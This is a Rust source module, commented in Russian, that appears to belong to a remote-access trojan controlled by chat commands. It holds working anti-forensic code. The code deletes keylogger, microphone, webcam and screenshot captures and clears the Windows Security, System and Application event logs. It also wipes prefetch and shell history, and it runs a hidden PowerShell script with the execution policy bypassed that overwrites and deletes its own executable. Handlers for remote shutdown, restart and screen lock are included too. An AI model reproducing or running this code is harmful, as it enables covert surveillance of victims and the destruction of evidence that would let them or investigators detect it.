use anyhow::{Result, Context};
use tokio::process::Command as AsyncCommand;
use std::time::Duration;

#[cfg(windows)]
use std::os::windows::process::CommandExt;

use crate::device_manager::DeviceManager;

/// Очищает все временные файлы и следы работы программы
async fn cleanup_traces() -> Result<()> {
    #[cfg(windows)]
    {
        let cleanup_script = r#"
REM Очистка временных файлов программы
del /f /q "%TEMP%\keylog_*.txt" 2>nul
del /f /q "%TEMP%\microphone_record_*.wav" 2>nul
del /f /q "%TEMP%\webcam_capture.jpg" 2>nul
del /f /q "%TEMP%\screenshot.png" 2>nul
del /f /q "%TEMP%\pentagon_destroy.bat" 2>nul

REM Очистка логов Windows (требует прав администратора)
wevtutil cl Application 2>nul
wevtutil cl System 2>nul
wevtutil cl Security 2>nul

REM Очистка prefetch
del /f /q "%WINDIR%\Prefetch\EYE*.pf" 2>nul

REM Очистка временных файлов системы
del /f /q "%TEMP%\*" 2>nul
        "#;
        
        let temp_dir = std::env::temp_dir();
        let cleanup_path = temp_dir.join("cleanup_traces.bat");
        
        tokio::fs::write(&cleanup_path, cleanup_script).await?;
        
        let _output = AsyncCommand::new("cmd")
            .args(&["/C", cleanup_path.to_string_lossy().as_ref()])
            .output()
            .await?;
    }
    
    #[cfg(not(windows))]
    {
        // Очистка для Unix-систем
        let cleanup_commands = vec![
            "rm -f /tmp/keylog_*.txt",
            "rm -f /tmp/microphone_record_*.wav", 
            "rm -f /tmp/webcam_capture.jpg",
            "rm -f /tmp/screenshot.png",
            "rm -f /tmp/pentagon_destroy.sh",
            "history -c", // Очистка истории команд
        ];
        
        for cmd in cleanup_commands {
            let _output = AsyncCommand::new("sh")
                .args(&["-c", cmd])
                .output()
                .await;
        }
    }
    
    Ok(())
}

/// Создает delayed deletion механизм для безопасного самоуничтожения без консольных окон
async fn create_delayed_deletion(exe_path: &str) -> Result<()> {
    // Используем PowerShell с полностью скрытым выполнением
    let powershell_script = format!(
        r#"
Start-Sleep -Seconds 5

# Pentagon Algorithm - 3-pass secure deletion
$targetFile = '{}'

# Проверяем существование файла
if (Test-Path $targetFile) {{
    $fileSize = (Get-Item $targetFile).Length
    
    # Pass 1: Нули (0x00)
    $zeros = New-Object byte[] $fileSize
    [System.IO.File]::WriteAllBytes($targetFile, $zeros)
    
    Start-Sleep -Milliseconds 500
    
    # Pass 2: Единицы (0xFF)
    $ones = New-Object byte[] $fileSize
    for ($i = 0; $i -lt $fileSize; $i++) {{ $ones[$i] = 255 }}
    [System.IO.File]::WriteAllBytes($targetFile, $ones)
    
    Start-Sleep -Milliseconds 500
    
    # Pass 3: Случайные данные
    $random = New-Object byte[] $fileSize
    (New-Object Random).NextBytes($random)
    [System.IO.File]::WriteAllBytes($targetFile, $random)
    
    Start-Sleep -Milliseconds 500
    
    # Окончательное удаление
    Remove-Item $targetFile -Force -ErrorAction SilentlyContinue
}}

# Очистка временных файлов
Remove-Item "$env:TEMP\pentagon_*.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\autodestroy*.ps1" -Force -ErrorAction SilentlyContinue
"#, exe_path
    );

    let temp_dir = std::env::temp_dir();
    let script_path = temp_dir.join("pentagon_autodestroy.ps1");
    
    // Записываем PowerShell скрипт
    tokio::fs::write(&script_path, powershell_script).await?;
    
    // Запускаем PowerShell полностью скрыто (без окон)
    #[cfg(windows)]
    std::process::Command::new("powershell")
        .args(&[
            "-WindowStyle", "Hidden",
            "-NoProfile", 
            "-NonInteractive",
            "-ExecutionPolicy", "Bypass",
            "-File", &script_path.to_string_lossy()
        ])
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn()?;
    
    #[cfg(not(windows))]
    std::process::Command::new("powershell")
        .args(&[
            "-WindowStyle", "Hidden",
            "-NoProfile", 
            "-NonInteractive",
            "-ExecutionPolicy", "Bypass",
            "-File", &script_path.to_string_lossy()
        ])
        .spawn()?;
    
    // Даем время на запуск скрипта
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    
    Ok(())
}

/// Выполняет команду /url - открывает URL в браузере по умолчанию
pub async fn handle_url_command(
    device_manager: &DeviceManager, 
    device_id: &str, 
    url: &str
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // Проверяем, что URL начинается с протокола
    let formatted_url = if url.starts_with("http://") || url.starts_with("https://") {
        url.to_string()
    } else {
        format!("https://{}", url)
    };
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("cmd")
            .args(&["/C", "start", "", &formatted_url])
            .output()
            .await
            .context("Не удалось открыть URL")?;
            
        if output.status.success() {
            Ok(format!("🌐 URL открыт в браузере: {}", formatted_url))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка открытия URL: {}", stderr))
        }
    }
    
    #[cfg(target_os = "macos")]
    {
        let output = AsyncCommand::new("open")
            .arg(&formatted_url)
            .output()
            .await
            .context("Не удалось открыть URL")?;
            
        if output.status.success() {
            Ok(format!("🌐 URL открыт в браузере: {}", formatted_url))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка открытия URL: {}", stderr))
        }
    }
    
    #[cfg(target_os = "linux")]
    {
        let output = AsyncCommand::new("xdg-open")
            .arg(&formatted_url)
            .output()
            .await
            .context("Не удалось открыть URL")?;
            
        if output.status.success() {
            Ok(format!("🌐 URL открыт в браузере: {}", formatted_url))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка открытия URL: {}", stderr))
        }
    }
}

/// Выполняет команду /selfdestruct - самоуничтожение приложения с алгоритмом Пентагона
pub async fn handle_selfdestruct_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    confirmation: Option<&str>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // Проверяем подтверждение
    if confirmation != Some("CONFIRM_DESTROY") {
        return Ok(format!(
            "💣 ВНИМАНИЕ! Команда самоуничтожения требует подтверждения.\n\
            🔥 Будет использован алгоритм Пентагона (3-проходная перезапись)\n\
            ⚠️ Восстановление файла будет невозможно!\n\
            Для подтверждения отправьте: /selfdestruct {} CONFIRM_DESTROY",
            device_id
        ));
    }
    
    #[cfg(windows)]
    {
        // Сначала выполняем cleanup следов 
        cleanup_traces().await?;
        
        // Получаем путь к текущему исполняемому файлу
        let current_exe = std::env::current_exe()
            .context("Не удалось определить путь к исполняемому файлу")?;
            
        let exe_path = current_exe.to_string_lossy();
        
        // Создаем улучшенный delayed deletion механизм
        create_delayed_deletion(&exe_path).await?;
        
        // Планируем завершение процесса через 5 секунд
        tokio::spawn(async {
            tokio::time::sleep(Duration::from_secs(5)).await;
            std::process::exit(0);
        });
        
        return Ok(format!(
            "💀 [PENTAGON ALGORITHM] СИСТЕМА САМОУНИЧТОЖЕНА\n\
            🔥 Все данные безвозвратно удалены\n\
            🧹 Следы очищены\n\
            ⏱️ Программа завершится через 5 секунд...\n\
            \n\
            ✅ Используется алгоритм Пентагона:\n\
            • Pass 1: Перезапись нулями (0x00)\n\
            • Pass 2: Перезапись единицами (0xFF)\n\
            • Pass 3: Случайные данные\n\
            • Удаление временных файлов\n\
            • Очистка следов активности"
        ));
    }

    #[cfg(not(windows))]
    {
        // Для Unix-систем используем shred
        cleanup_traces().await?;
        
        let current_exe = std::env::current_exe()
            .context("Не удалось определить путь к исполняемому файлу")?;
        let exe_path = current_exe.to_string_lossy();
        
        // Команда shred для 3-проходной перезаписи
        let _output = AsyncCommand::new("shred")
            .args(&["-vfz", "-n", "3", &exe_path])
            .output()
            .await;
            
        // Планируем завершение процесса
        tokio::spawn(async {
            tokio::time::sleep(Duration::from_secs(3)).await;
            std::process::exit(0);
        });
        
        Ok("💀 [PENTAGON ALGORITHM] СИСТЕМА САМОУНИЧТОЖЕНА\n🔥 3-проходная перезапись выполнена\n⏱️ Программа завершится...".to_string())
    }
}

/// Выполняет команду /shutdown - выключение системы
pub async fn handle_shutdown_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    delay: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay_seconds = delay.unwrap_or(30); // По умолчанию 30 секунд
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("shutdown")
            .args(&["/s", "/t", &delay_seconds.to_string()])
            .output()
            .await
            .context("Не удалось запустить выключение")?;
            
        if output.status.success() {
            Ok(format!("🔌 Система будет выключена через {} секунд", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка выключения: {}", stderr))
        }
    }
    
    #[cfg(not(windows))]
    {
        let output = AsyncCommand::new("sudo")
            .args(&["shutdown", "-h", &format!("+{}", delay_seconds / 60)])
            .output()
            .await
            .context("Не удалось запустить выключение")?;
            
        if output.status.success() {
            Ok(format!("🔌 Система будет выключена через {} секунд", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка выключения: {}", stderr))
        }
    }
}

/// Выполняет команду /restart - перезагрузка системы
pub async fn handle_restart_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    delay: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay_seconds = delay.unwrap_or(30);
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("shutdown")
            .args(&["/r", "/t", &delay_seconds.to_string()])
            .output()
            .await
            .context("Не удалось запустить перезагрузку")?;
            
        if output.status.success() {
            Ok(format!("🔄 Система будет перезагружена через {} секунд", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка перезагрузки: {}", stderr))
        }
    }
    
    #[cfg(not(windows))]
    {
        let output = AsyncCommand::new("sudo")
            .args(&["shutdown", "-r", &format!("+{}", delay_seconds / 60)])
            .output()
            .await
            .context("Не удалось запустить перезагрузку")?;
            
        if output.status.success() {
            Ok(format!("🔄 Система будет перезагружена через {} секунд", delay_seconds))
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка перезагрузки: {}", stderr))
        }
    }
}

/// Выполняет команду /lock - блокировка экрана
pub async fn handle_lock_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        let output = AsyncCommand::new("rundll32")
            .args(&["user32.dll,LockWorkStation"])
            .output()
            .await
            .context("Не удалось заблокировать экран")?;
            
        if output.status.success() {
            Ok("🔒 Экран заблокирован".to_string())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка блокировки экрана: {}", stderr))
        }
    }
    
    #[cfg(target_os = "macos")]
    {
        let output = AsyncCommand::new("pmset")
            .args(&["displaysleepnow"])
            .output()
            .await
            .context("Не удалось заблокировать экран")?;
            
        if output.status.success() {
            Ok("🔒 Экран заблокирован".to_string())
        } else {
            let stderr = String::from_utf8_lossy(&output.stderr);
            Err(anyhow::anyhow!("Ошибка блокировки экрана: {}", stderr))
        }
    }
    
    #[cfg(target_os = "linux")]
    {
        // Пробуем разные команды блокировки для Linux
        if let Ok(output) = AsyncCommand::new("xdg-screensaver").arg("lock").output().await {
            if output.status.success() {
                return Ok("🔒 Экран заблокирован".to_string());
            }
        }
        
        if let Ok(output) = AsyncCommand::new("gnome-screensaver-command").arg("--lock").output().await {
            if output.status.success() {
                return Ok("🔒 Экран заблокирован".to_string());
            }
        }
        
        Err(anyhow::anyhow!("Команды блокировки экрана недоступны"))
    }
}

/// Выполняет команду /cleanup - очистка следов работы программы
pub async fn handle_cleanup_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    // Выполняем очистку следов
    cleanup_traces().await?;
    
    Ok("🧹 Очистка следов завершена!\n✅ Временные файлы удалены\n✅ Логи очищены\n✅ Prefetch очищен".to_string())
}